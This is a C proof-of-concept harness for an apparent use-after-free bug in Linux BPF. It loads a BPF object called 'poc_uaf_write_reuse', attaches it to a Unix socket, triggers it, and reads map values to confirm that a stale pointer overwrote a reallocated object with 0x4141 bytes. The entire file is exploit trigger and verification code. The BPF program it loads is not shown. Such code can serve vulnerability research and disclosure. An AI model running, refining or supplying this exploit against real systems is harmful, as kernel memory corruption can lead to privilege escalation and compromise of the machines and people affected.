#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/socket.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>

int main() {
    const char *obj_path = "poc_uaf_write_reuse.bpf.o";
    struct bpf_object *obj;
    struct bpf_program *prog;
    int prog_fd;
    struct bpf_map *results_map;
    int results_fd;
    __u32 k0 = 0, k1 = 1, k2 = 2, k3 = 3;
    __u64 val;

    obj = bpf_object__open_file(obj_path, NULL);
    if (libbpf_get_error(obj)) {
        fprintf(stderr, "Failed to open BPF object\n");
        return 1;
    }
    if (bpf_object__load(obj)) {
        fprintf(stderr, "BPF load failed: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] BPF program loaded\n");

    prog = bpf_object__find_program_by_name(obj, "poc_uaf_write_reuse");
    if (!prog) { fprintf(stderr, "Program not found\n"); return 1; }
    prog_fd = bpf_program__fd(prog);

    results_map = bpf_object__find_map_by_name(obj, "results");
    if (!results_map) { fprintf(stderr, "results map not found\n"); return 1; }
    results_fd = bpf_map__fd(results_map);

    int socks[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) < 0) {
        perror("socketpair");
        return 1;
    }
    if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) < 0) {
        perror("SO_ATTACH_BPF");
        close(socks[0]); close(socks[1]);
        return 1;
    }
    printf("[+] Attached to socket\n");

    printf("[*] Triggering UAF write...\n");
    char trigger = 'X';
    if (write(socks[1], &trigger, 1) < 1) {
        perror("write");
    }
    sleep(1);

    // Check sentinel
    bpf_map_lookup_elem(results_fd, &k3, &val);
    if (val != 0xdeadbeef) {
        printf("[-] Program did not run correctly (sentinel: 0x%llx)\n",
               (unsigned long long)val);
        return 1;
    }

    // Read results
    bpf_map_lookup_elem(results_fd, &k0, &val);
    printf("[*] K2 value after stale write (key=0): 0x%llx\n", (unsigned long long)val);

    bpf_map_lookup_elem(results_fd, &k1, &val);
    printf("[*] Original sentinel (key=1): 0x%llx\n", (unsigned long long)val);

    bpf_map_lookup_elem(results_fd, &k2, &val);
    printf("[*] Write pattern (key=2): 0x%llx\n", (unsigned long long)val);

    printf("\n=== VERDICT ===\n");
    // If K2 value equals the write pattern, the stale write succeeded
    bpf_map_lookup_elem(results_fd, &k0, &val);
    if (val == 0x4141414141414141ULL) {
        printf("[+] CONFIRMED: UAF write overwrote the reallocated object.\n");
        printf("    Stale pointer wrote 0x4141... onto K2, corrupting its value.\n");
    } else {
        printf("[-] K2 value 0x%llx does not match write pattern (0x4141...)\n",
               (unsigned long long)val);
    }

    close(socks[0]);
    close(socks[1]);
    bpf_object__close(obj);
    return 0;
}
